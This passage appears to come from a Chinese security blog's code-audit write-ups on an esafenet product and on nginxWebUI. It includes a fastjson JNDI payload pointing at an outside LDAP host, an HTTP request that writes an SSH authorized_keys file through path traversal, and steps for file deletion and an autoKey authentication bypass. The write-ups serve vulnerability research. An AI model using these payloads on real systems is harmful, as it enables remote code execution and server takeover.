title="UploadFileFromClientServiceForClient_upload"></a>UploadFileFromClientServiceForClient_upload</h3><p><img src="image-20231222175051914.png" alt="image-20231222175051914"></p><p><img src="image-20231222175126611.png" alt="image-20231222175126611"></p><p>解密value_code</p><p><img src="image-20231222175227500.png" alt="image-20231222175227500"></p><p>在下面进行判断</p><p><img src="image-20231222175404289.png" alt="image-20231222175404289"></p><p>然后可控fileName, InputStream从req获取，最后写入，同理目录穿越写入。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><img src="image-20231222175836126.png" alt="image-20231222175836126"></p><h2 id="0x05-fastjson"><a href="#0x05-fastjson" class="headerlink" title="0x05 fastjson"></a>0x05 fastjson</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataflowconf/</span>saveConfig.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.saveConfig<br></code></pre></td></tr></table></figure><p><img src="image-20231227004844929.png" alt="image-20231227004844929"></p><p><img src="image-20231227004959240.png" alt="image-20231227004959240"></p><p><img src="image-20231227005043898.png" alt="image-20231227005043898"></p><p>我是大彩笔</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>直接使用1.2.47的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;f&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.211.55.2:80/Object&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/importPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.importPolicy<br></code></pre></td></tr></table></figure><p><img src="image-20231227005119022.png" alt="image-20231227005119022"></p><p><img src="image-20231227005219052.png" alt="image-20231227005219052"></p><p>从file获取流加密，然后转对象</p><p><img src="image-20231227005737683.png" alt="image-20231227005737683"></p><p><img src="image-20231227005640532.png" alt="image-20231227005640532"></p><p>加密方法</p><p><img src="image-20231227005303455.png" alt="image-20231227005303455"></p><p>然后进行反序列化。</p><p>很明确了，就是构造加密后的byte为反序列化数据，然后当file上传，后段会先加密file，然后进行反序列化。</p><p>需要自己实现对应的解密方法。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231227015928700.png" alt="image-20231227015928700"></p><h2 id="0x07-反射调用"><a href="#0x07-反射调用" class="headerlink" title="0x07 反射调用"></a>0x07 反射调用</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataconf/g</span>etDataConfInfo.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.DataConfController<br></code></pre></td></tr></table></figure><p><img src="image-20231227155316597.png" alt="image-20231227155316597"></p><p><img src="image-20231227134859229-3663575.png" alt="image-20231227134859229"></p><p>反射调用</p><h2 id="0x09-sql注入"><a href="#0x09-sql注入" class="headerlink" title="0x09 sql注入"></a>0x09 sql注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/exportPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.DlpPolicyController<br></code></pre></td></tr></table></figure><p><img src="image-20231227153543499.png" alt="image-20231227153543499"></p><p><img src="image-20231227153549180.png" alt="image-20231227153549180"></p><p><img src="image-20231227153554511.png" alt="image-20231227153554511"></p><p>看见很多都是直接拼接，就不一一找了</p><h2 id="0x010-后语"><a href="#0x010-后语" class="headerlink" title="0x010 后语"></a>0x010 后语</h2><p>​练手不错。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginxWebUI代码审计</title>
    <link href="/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="0x04-csrf创建管理员-全版本"><a href="#0x04-csrf创建管理员-全版本" class="headerlink" title="0x04 csrf创建管理员 (全版本)"></a>0x04 csrf创建管理员 (全版本)</h2><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 